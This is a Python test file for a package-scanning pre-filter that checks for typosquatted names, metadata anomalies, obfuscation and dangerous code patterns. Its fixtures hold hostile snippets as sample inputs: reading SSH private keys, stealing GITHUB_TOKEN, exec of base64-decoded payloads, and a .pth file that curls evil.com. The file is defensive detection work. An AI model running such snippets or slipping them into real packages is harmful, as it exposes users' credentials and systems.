"""Tests for the static pre-filter engine."""

from aigate.config import Config
from aigate.models import PackageInfo, RiskLevel
from aigate.prefilter import (
    check_dangerous_patterns,
    check_high_entropy,
    check_metadata_anomalies,
    check_typosquatting,
    run_prefilter,
)


def _make_pkg(**kwargs) -> PackageInfo:
    defaults = dict(
        name="testpkg",
        version="1.0.0",
        ecosystem="pypi",
        author="Test Author",
        description="A test package",
        repository="https://github.com/test/testpkg",
    )
    defaults.update(kwargs)
    return PackageInfo(**defaults)


class TestTyposquatting:
    def test_exact_match_not_flagged(self):
        assert check_typosquatting("requests", "pypi") == []

    def test_obvious_typosquat(self):
        result = check_typosquatting("requets", "pypi")
        assert len(result) > 0
        assert any("requests" in r for r in result)

    def test_unrelated_name_not_flagged(self):
        result = check_typosquatting("my-totally-unique-package-xyz", "pypi")
        assert result == []

    def test_npm_ecosystem(self):
        result = check_typosquatting("expreess", "npm")
        assert len(result) > 0


class TestMetadataAnomalies:
    def test_normal_package(self):
        pkg = _make_pkg()
        assert check_metadata_anomalies(pkg) == []

    def test_no_author(self):
        pkg = _make_pkg(author="")
        signals = check_metadata_anomalies(pkg)
        assert any("no_author" in s for s in signals)

    def test_no_repo(self):
        pkg = _make_pkg(repository="", homepage="")
        signals = check_metadata_anomalies(pkg)
        assert any("no_repo" in s for s in signals)

    def test_low_downloads(self):
        pkg = _make_pkg(download_count=5)
        signals = check_metadata_anomalies(pkg)
        assert any("low_downloads" in s for s in signals)

    def test_install_scripts(self):
        pkg = _make_pkg(has_install_scripts=True)
        signals = check_metadata_anomalies(pkg)
        assert any("has_install_scripts" in s for s in signals)


class TestDangerousPatterns:
    def test_clean_code(self):
        files = {"main.py": "def hello():\n    print('hello world')\n"}
        assert check_dangerous_patterns(files) == []

    def test_eval_detected(self):
        files = {"setup.py": "eval(compile(data, '<string>', 'exec'))"}
        signals = check_dangerous_patterns(files)
        assert len(signals) > 0
        assert any("eval" in s for s in signals)

    def test_credential_access(self):
        files = {"inject.py": "open(os.path.expanduser('~/.ssh/id_rsa')).read()"}
        signals = check_dangerous_patterns(files)
        assert any(".ssh/" in s for s in signals)

    def test_base64_exec(self):
        files = {"loader.py": "exec(base64.b64decode(payload))"}
        signals = check_dangerous_patterns(files)
        assert len(signals) >= 2  # base64 + exec

    def test_env_token_theft(self):
        files = {"steal.py": "token = os.environ.get('GITHUB_TOKEN')"}
        signals = check_dangerous_patterns(files)
        assert any("GITHUB_TOKEN" in s for s in signals)

    def test_pth_file(self):
        files = {"evil.pth": "import os; os.system('curl http://evil.com')"}
        signals = check_dangerous_patterns(files)
        assert any("HIGH" in s for s in signals)  # .pth = install file = HIGH


class TestHighEntropy:
    def test_normal_code(self):
        files = {"main.py": "x = 1\ny = 2\nprint(x + y)\n"}
        assert check_high_entropy(files) == []

    def test_obfuscated_string(self):
        # Generate a high-entropy line (random-looking)
        obf = "a" * 20 + "".join(chr(i % 94 + 33) for i in range(100))
        files = {"obf.py": obf}
        signals = check_high_entropy(files, threshold=4.5)
        assert len(signals) > 0


class TestRunPrefilter:
    def test_whitelisted_package(self):
        pkg = _make_pkg(name="safe-pkg")
        config = Config(whitelist=["safe-pkg"])
        result = run_prefilter(pkg, config)
        assert result.passed
        assert result.risk_level == RiskLevel.NONE

    def test_blocklisted_package(self):
        pkg = _make_pkg(name="evil-pkg")
        config = Config(blocklist=["evil-pkg"])
        result = run_prefilter(pkg, config)
        assert not result.passed
        assert result.risk_level == RiskLevel.CRITICAL

    def test_clean_package(self):
        pkg = _make_pkg()
        config = Config()
        result = run_prefilter(pkg, config)
        assert result.passed

    def test_suspicious_package_needs_ai(self):
        pkg = _make_pkg(name="testpkg", has_install_scripts=True, author="", repository="", homepage="")
        config = Config()
        source = {"setup.py": "exec(base64.b64decode(os.environ['PAYLOAD']))"}
        result = run_prefilter(pkg, config, source)
        assert result.needs_ai_review
        assert result.risk_level in (RiskLevel.HIGH, RiskLevel.CRITICAL)
